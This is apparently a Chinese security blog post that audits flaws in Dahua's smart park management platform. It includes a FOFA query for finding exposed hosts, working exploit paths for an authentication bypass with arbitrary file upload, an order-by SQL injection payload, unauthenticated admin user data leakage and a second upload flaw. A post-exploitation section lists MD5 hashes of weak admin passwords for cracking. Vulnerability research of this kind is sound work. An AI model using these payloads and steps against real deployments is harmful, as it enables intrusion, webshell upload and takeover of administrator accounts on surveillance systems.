![](https://i-blog.csdnimg.cn/blog_migrate/3e1ae1e413528d7ced815fdadc2f1eb6.png)

在23年 HW 期间大华智慧园区综合管理平台爆出来了非常多的漏洞，本着学习的心态来看看漏洞成因
FOFA：`body="/WPMS/asset/lib/gridster/"`


## 代码审计
### devicePoint_addImgIco 任意文件上传
```
/emap/devicePoint_addImgIco?hasSubsystem=true
```
可以看到 emap 是由 struts2 框架搭建的，在配置文件`emap/WEB-INF/classes/struts/struts-default.xml`中发现 myInterceptor 拦截器
![](https://i-blog.csdnimg.cn/blog_migrate/503d085d4d11e0c1891617ce3e165269.png)

它会先调用`emap/WEB-INF/classes/com/dahuatech/util/aop/MyInterceptor.class`的 intercept 方法
![](https://i-blog.csdnimg.cn/blog_migrate/cef016aba2f911b9ffee4dd598b96a90.png)

如果执行的是 ignoreActionMethod 或者`this.before(invocation)`为true，就会绕过权限验证
```java
private List<String> ignoreActionMethod = Arrays.asList("emap_noticeBitmapSyncData", "login_userLogout", "staircase_getListByMapId", "emap_findConfigData", "bitmap_findAllMap", "picture_getPicPath");
```

跟进 before 方法
```java
public boolean before(ActionInvocation invocation) {
    boolean permission = true;

    try {
        ActionContext cxt = invocation.getInvocationContext();
        HttpServletRequest request = (HttpServletRequest)cxt.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest");
        HttpServletResponse response = (HttpServletResponse)cxt.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse");
        String hasSubsystem = request.getParameter("hasSubsystem");
        if ("execute".contains(cxt.getName())) {
            this.logger.error("主系统来获取菜单" + cxt.getName());
            this.isReqLegal(request);
            permission = true;
        } else {
            Map<String, Object> session = cxt.getSession();
            Object token = session.get(Constants.TOKEN);
            this.logger.error("检查session" + token);
            String ptoken;
            if (token == null) {
                if (hasSubsystem != null && hasSubsystem.equals("true")) {
                    ptoken = this.getRequestBodyString(request.getReader());
                    this.logger.info("子系统访问param:" + ptoken);
                    Map<String, String> subBean = this.getMapFromStringParam(ptoken);
                    if (this.subSystem.contains(((String)subBean.get("subSystem")).toString())) {
                        request.setAttribute("param", subBean.get("param"));
                        permission = true;
                    } else {
                        permission = false;
                    }
                } else {
                    permission = this.hasLogin(request, response, session);
                }
            } else {
                ptoken = request.getParameter("token");
                if (StringUtil.notNull(ptoken)) {
                    if (ptoken.equals(token.toString())) {
                        permission = true;
                    } else {
                        permission = this.hasLogin(request, response, session);
                    }
                }
            }
        }
    } catch (Exception var11) {
        var11.printStackTrace();
    }

    return permission;
}
```
这段代码是很经典的逻辑缺陷问题，permission默认设置为true，而 catch 这里并不会异常退出，而是打印错误后继续执行，所以说能在`permission = false`执行之前走到 catch 这里，就不需要鉴权了
![](https://i-blog.csdnimg.cn/blog_migrate/da1ea74308c7037bdb3a3a8a4a71f440.png)

我们可以控制`hasSubsystem`的值为 true ，继续往下执行，`subBean.get("subSystem")`未能找到 subSystem 键，会产生报错，达成条件


找到`emap/WEB-INF/classes/com/dahuatech/emap/mapbiz/poi/action/PoiAction.class`的 addImgIco 方法
![](https://i-blog.csdnimg.cn/blog_migrate/ed53a6374976273f94ef29be65367d7e.png)

这里上传路径是固定的：`/opt/tomcat/webapps/upload/emap/society_new`，并且文件后缀可控，最后会返回上传的文件名
![](https://i-blog.csdnimg.cn/blog_migrate/90e3d4b16bacaa33b77aa805945e2e3f.png)


### getFaceCapture SQL注入
```
/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(114514)),0x7e),1)--%22%7D/extend/%7B%7D
```
看到`portal/WEB-INF/web.xml`
![](https://i-blog.csdnimg.cn/blog_migrate/7450c3d7cb2c1321842ca125e3d64f40.png)

存在CXFServlet，对应的接口是`/ws/*`和`/services/*`，webService的配置文件在`portal/WEB-INF/classes/applicationContext.xml`
![](https://i-blog.csdnimg.cn/blog_migrate/52d8ac0e41a36600f0fdfc4421feb7c7.png)

给出了所有的 WebService
主要看到`portal/WEB-INF/classes/com/dahua/dssc/webservice/carQuery/CarQueryServiceImpl.class`的 getFaceCapture 方法
![](https://i-blog.csdnimg.cn/blog_migrate/12be4590f8c38886a22a3e47ca0540fd.png)

这里如果没有传 orderBy 参数，会设置默认参数
```java
public void defaultFaceCaptureSearchOrder(Object o) {
    if (o instanceof Page) {
        Page<T> page = (Page)o;
        if (page != null && StringUtil.isEmpty(page.getOrderBy())) {
            page.setOrderBy("detectTime");
            page.setOrder("desc");
        }
    }

}
```
该方法最终会 return json，期间会执行
```java
json = this.faceCaptureManager.getFaceCaptureJson(searchBean, page, extend);
```
跟进到`portal/WEB-INF/classes/com/dahua/dssc/business/face/manager/impl/FaceCaptureManagerImpl.class`的 getFaceCaptureJson 方法
![](https://i-blog.csdnimg.cn/blog_migrate/b31fc36e21ecf6a5305871e4b2a4ffb8.png)

会调用 this.getFaceCapturePage 方法
![](https://i-blog.csdnimg.cn/blog_migrate/33fbbfcd68f4f6a7f5d4b957f4f4fa13.png)

走到`portal/WEB-INF/classes/com/dahua/dssc/business/face/dao/impl/FaceCaptureDaoImpl.class`的 getFaceCapturePage 方法
![](https://i-blog.csdnimg.cn/blog_migrate/b6834afae981258dad89100390ebce20.png)

调用了父类的 findSql 方法，`portal/WEB-INF/classes/com/dahua/dssc/base/dao/AbstractDao.class`
```java
public Page<T> findSql(Page<T> page, Class<T> clazz, String sql, Object... values) {
    return this.paginationJdbcSupport.find(page, clazz, sql, values);
}
```
调用到`portal/WEB-INF/classes/com/dahua/dssc/base/dao/PaginationJdbcSupport.class`的 find 方法
![](https://i-blog.csdnimg.cn/blog_migrate/76e1196065792b64cf789812e3263a12.png)

由于数据库是MySql，跟进 this.getResultMySql
![](https://i-blog.csdnimg.cn/blog_migrate/0097edf381982a2212e40f3dbf88a9b1.png)

这里如果 page.getOrderBy() 不为空，则在最后 append 拼接sql语句，造成 order by 报错注入
最后执行的语句：
```sql
select t.CAPTUREINDEX as id,t.DETECTTIME as detectTime,t.FACEPATH as facePath,t.ORIGINALPATH as origPath,t.CHANNELID as chnId,t.DEVICEADDR as devChnname,date_format(t.DETECTTIME,'%Y-%m-%d %H:%i:%s') as capDateStr from IVS_FACE_CAPTURE t where 1=1 order by 1 and 1=updatexml(1,concat(0x7e,(select md5(114514)),0x7e),1)-- asc limit -1,-1
```
![](https://i-blog.csdnimg.cn/blog_migrate/b2fb227ac3fd4167de8df984a9d5e44f.png)

### user_getUserInfoByUserName.action 用户信息泄露
```
/admin/user_getUserInfoByUserName.action?userName=system
```
看到拦截器`admin/WEB-INF/classes/com/dahua/admin/common/aop/Interceptor.class`
```java
if (userBean == null && !servletPath.contains("/ztree.action") && !servletPath.contains("/ztree_refresh.action") && !servletPath.contains("/user_getUserInfoByUserName.action") && !servletPath.contains("/cascade_") && !servletPath.contains("/videoplanalone_") && !servletPath.contains("/access_") && !servletPath.contains("/nvrrelation_updateNvrRelationStat.action") && !servletPath.contains("/specialMenu_isAccessable.action") && !servletPath.contains("/role_getAvailableVideoWallListJson.action") && !servletPath.contains("/message.action") && !servletPath.contains("/deviceReconfigServer_") && !servletPath.contains("getCurrentProductInfo.action") && !servletPath.contains("rfid_getRfidDeviceInfo.action") && !servletPath.contains("configReader_refreshConfig.action") && !servletPath.contains("/itc/itcRecord_") && !servletPath.contains("/itc/itcztree.action") && !servletPath.contains("/itc/carSurvey") && !servletPath.contains("/subSystem_executeByIndex.action") && !servletPath.contains("/subSystem_isRunning.action") && !servletPath.contains("/config_remoteSaveWhiteList.action") && !servletPath.contains("/config_remoteGetWhiteList.action") && !servletPath.contains("/config_isHttpsEnable.action") && !servletPath.contains("/config_resetFtpPassword.action") && !servletPath.contains("/subSystem_isCorrectUser.action") && !servletPath.contains("/subSystem_getSubStatusByName.action") && !servletPath.contains("/user_checkPasswordDeadline.action") && !servletPath.contains("/user_checkEditFtpPass.action") && !servletPath.contains("/user_checkEditPass.action") && !servletPath.contains("/config_getPassWordStrength") && !servletPath.contains("/config_changePort.action") && !servletPath.contains("/config_synMasterIp.action") && !servletPath.contains("/authorize_") && !servletPath.contains("/domain_")) {
```
![](https://i-blog.csdnimg.cn/blog_migrate/fda7fc4307c2724987f26c31f50d610c.png)

不需要权限访问的 action 都列出来了
看到`admin/WEB-INF/classes/com/dahua/admin/business/user/action/UserAction.class`的 getUserInfoByUserName 方法
![](https://i-blog.csdnimg.cn/blog_migrate/a0fa4abdf1fce54a0b54c0e91dcd6a35.png)

接收 userName 参数，然后调用`this.userManager.getUserBean(userName)`，并会返回结果
跟进到`admin/WEB-INF/classes/com/dahua/admin/business/user/manager/UserManagerImpl.class`的 getUserBean 方法
![](https://i-blog.csdnimg.cn/blog_migrate/d678455e8fce8f7600a915720db5f78c.png)

跟进`admin/WEB-INF/classes/com/dahua/admin/business/user/dao/UserDaoImpl.class`的 getUser 方法
![](https://i-blog.csdnimg.cn/blog_migrate/3539f6c90419ce1db4455499c82f3ef4.png)

发现使用的是`hibernateTemplate.findByCriteria`，根据 loginName 进行查询，存在默认管理员账户：system
![](https://i-blog.csdnimg.cn/blog_migrate/d5acd7672760e28da8dd045062e0415e.png)


### video 任意文件上传
```
/publishing/publishing/material/file/video
```
看到配置文件`publishing/WEB-INF/web.xml`，发现权限认证的filter
![](https://i-blog.csdnimg.cn/blog_migrate/40ecbe31ea67037d9b17fe353516a701.png)

走到`publishing/WEB-INF/classes/com/dahua/cardsolution/authentication/UserAuthenticationFilter.java`
![](https://i-blog.csdnimg.cn/blog_migrate/7945487aea98992ed5013f1dbdeb92c1.png)

发现如果包含`*/publishing/publishing/*`路径，或者路径后缀为`.css`、`.js`、`.png`、`.gif`，则不鉴权

看到`publishing/WEB-INF/classes/com/dahua/cardsolution/controller/publishing/MaterialController.java`
![](https://i-blog.csdnimg.cn/blog_migrate/f5f1a8baf5209b43ea0c14f0995e2bc1.png)

使用 MultipartFile 接收上传的文件，调用
```java
materialFile = buildMaterialFile(multipartFile);		
materialFile = materialService.addVideoFile(materialFile);
```
进行处理，最后返回 result 
跟进到`publishing-service-1.0.0.jar!/com/dahua/cardsolution/service/publishing/impl/MaterialServiceImpl.class`的 addVideoFile 方法
![](https://i-blog.csdnimg.cn/blog_migrate/fa2492d77485b263dfd9f9d5573ef068.png)

这里调用 this.fileManageService.generateFileName 重新生成文件名，并且调用 this.fileManageService.sendFile 上传文件，videoFile.setPath 保存了路径

跟进到`publishing-service-1.0.0.jar!/com/dahua/cardsolution/service/publishing/impl/FileManageServiceImpl.class`
![](https://i-blog.csdnimg.cn/blog_migrate/bf3fa1925ecb3c8eb5a3c2c2f0e3601a.png)

发现文件后缀是可控的，文件写入的路径为：`/opt/ftp/publishingImg/VIDEO/`
这里使用了软链接，所以我们可以通过web路径访问到文件
![](https://i-blog.csdnimg.cn/blog_migrate/929c279141481e5ccc0ec1c717b2c0ee.png)

简单测试一下
![](https://i-blog.csdnimg.cn/blog_migrate/5e87fc3d36c53ef16ed99205e83511de.png)


参考：
[https://github.com/PeiQi0/PeiQi-WIKI-Book/tree/main/docs/wiki/iot/%E5%A4%A7%E5%8D%8E](https://github.com/PeiQi0/PeiQi-WIKI-Book/tree/main/docs/wiki/iot/%E5%A4%A7%E5%8D%8E)
[某华智慧园区-任意文件上传PoC](https://mp.weixin.qq.com/s/k_sloI1n22YEbRv5hR6eKg)

## 后渗透利用
来看一下数据库密码的生成规则
看到`admin/WEB-INF/classes/com/dahua/admin/util/EncryptionUtils.class`的 getEncryptedText 方法
```java
 public static String getEncryptedText(UserBean checkedUser) {
     return "true".equals(ConfigReader.getStringIsNull("user.loginpass.encryted")) ? encrypt(checkedUser.getLoginName() + ":dss:" + checkedUser.getLoginPass()) : checkedUser.getLoginPass();
 }
```
发现 loginPass 的值是`checkedUser.getLoginName() + ":dss:" + checkedUser.getLoginPass()`，然后调用 encrypt 方法加密生成的
![](https://i-blog.csdnimg.cn/blog_migrate/79cab679aea2981bd74b97caaf2b159f.png)

发现是使用md5进行加密的，下列是几个弱口令生成的密码：
```
system:dss:admin12345  md5: 5ce3960eac39a95ed67b654053849793
system:dss:admin123    md5: 278bf69381b3053c5387cf09bed039ce
system:dss:Admin123    md5: 1ebe47fb5b1299c1ecc061e248450b83
```
可以使用字典爆破md5值
![](https://i-blog.csdnimg.cn/blog_migrate/55af0a829fc70d9a286750fd053d5b28.png)

也可以连接数据库改 system 的密码进后台

